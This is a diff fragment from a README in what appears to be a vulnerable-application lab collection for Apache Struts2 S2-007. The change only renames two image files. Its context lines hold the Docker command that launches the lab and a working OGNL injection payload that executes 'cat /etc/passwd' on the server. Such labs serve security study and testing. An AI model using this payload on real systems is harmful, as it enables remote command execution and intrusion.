@@ -33,6 +33,6 @@ $ docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-007
 ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('cat /etc/passwd').getInputStream())) + '
 ```
 
-![](S2-007-1.png)
+![](s2-007-1.png)
 
-![](S2-007-2.png)
+![](s2-007-2.png)
